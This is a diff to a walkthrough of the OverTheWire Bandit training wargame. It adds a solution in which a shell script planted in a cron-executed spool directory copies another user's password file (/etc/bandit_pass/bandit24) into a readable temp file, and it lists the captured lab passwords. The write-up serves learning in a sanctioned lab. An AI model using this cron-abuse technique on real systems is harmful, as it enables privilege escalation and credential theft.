@@ -708,9 +708,11 @@ cat cronjob_bandit22
 >>> * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
 
 cat /usr/bin/cronjob_bandit22.sh
->>> #!/bin/bash
->>> chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
->>> cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+>>> 
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+<<<
 
 cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 >>> Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
@@ -776,7 +778,116 @@ Connect:```ssh bandit23@bandit.labs.overthewire.org -p 2220```
 Password:```jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n```
 
 Problem:
-- XXX
+- A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+- NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+- NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+Solution:
+```
+cd /etc/cron.d
+ls
+
+cat cronjob_bandit24
+>>> @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+>>> * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+```
+cat /usr/bin/cronjob_bandit24.sh
+>>>
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+<<<
+
+cd /usr/bin
+./cronjob_bandit24.sh
+>>>
+...
+Handling pycompile
+rm: cannot remove './pycompile': Permission denied
+Handling pydoc
+rm: cannot remove './pydoc': Permission denied
+Handling pydoc2.7
+rm: cannot remove './pydoc2.7': Permission denied
+Handling pydoc3
+rm: cannot remove './pydoc3': Permission denied
+Handling pydoc3.5
+rm: cannot remove './pydoc3.5': Permission denied
+Handling pygettext
+rm: cannot remove './pygettext': Permission denied
+Handling pygettext2.7
+...
+<<<
+
+ls -al /usr/bin/cronjob_bandit24.sh
+>>> -rwxr-x--- 1 bandit24 bandit23 376 May 14 09:41 /usr/bin/cronjob_bandit24.sh
+```
+```
+cd /var/spool
+ls -l
+>>> bandit24  cron  mail  rsyslog
+
+cd bandit24
+ls
+>>> ls: cannot open directory '.': Permission denied
+
+cd  /var/spool
+ls -l
+>>> drwxrwx-wx 40 root bandit24 4096 Sep  7 21:48 bandit24
+
+mkdir /tmp/<username>
+cd /tmp/<username>
+
+touch getPassword24.sh
+chmod +x getPassword24.sh
+vim getPassword24.sh
+
+touch password24.txt
+chmod 666 password24.txt
+
+# write the following lines of code into getPassword24.sh 
+>>>
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/sallycolly2/password24.txt
+<<<
+
+cp getPassword24.sh /var/spool/bandit24/getPassword24.sh
+ls -al /var/spool/bandit24/getPassword24.sh
+>>> -rwxr-xr-x 1 bandit23 bandit23 76 Sep  7 21:45 /var/spool/bandit24/getPassword24.sh
+
+(wait 60 sec)
+
+cat password24.txt
+>>> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+Output:
+```
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+
+## Level 24 → Level 25
+Connect:```ssh bandit24@bandit.labs.overthewire.org -p 2220```      
+Password:```UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ```
+
+Problem:
+- A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
 
 Solution:
 ```
